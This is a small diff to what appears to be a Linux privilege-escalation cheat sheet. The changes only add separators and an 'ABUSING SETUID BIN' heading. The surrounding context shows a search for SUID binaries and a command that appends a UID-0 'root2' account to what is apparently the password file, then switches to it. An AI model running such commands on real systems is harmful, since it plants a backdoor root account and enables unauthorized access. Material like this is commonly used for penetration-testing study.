@@ -119,7 +119,7 @@ lsmod
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-
+---
 ###### **FILE-TRANSFER** 
 
 **NETCAT**
@@ -190,5 +190,6 @@ echo "root2:<cript-hash-we-will-get-from-opnessl>:0:0:root:/root:/bin/bash" >> /
 su root2
 ```
 
+---
 
-
+**ABUSING SETUID BIN**
